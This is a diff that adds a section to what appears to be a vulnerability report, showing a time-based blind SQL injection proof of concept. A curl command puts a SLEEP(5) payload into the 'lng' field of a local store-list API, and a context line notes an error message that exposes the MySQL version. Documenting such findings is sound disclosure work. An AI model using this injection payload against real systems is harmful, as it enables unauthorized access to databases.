@@ -42,3 +42,14 @@ curl -X POST http://localhost:8000/api/v1/front/store/list \
 
 # Response exposes MySQL version in error message
 ```
+
+**2. Time-Based Blind SQL Injection**
+
+```bash
+# Causes 5-second delay, confirming SQL injection
+time curl -X POST http://localhost:8000/api/v1/front/store/list \
+  -H "Content-Type: application/json" \
+  -d '{"lat":"1","lng":"1'\'')) AND SLEEP(5))#"}'
+
+# Expected: ~5 second delay
+```
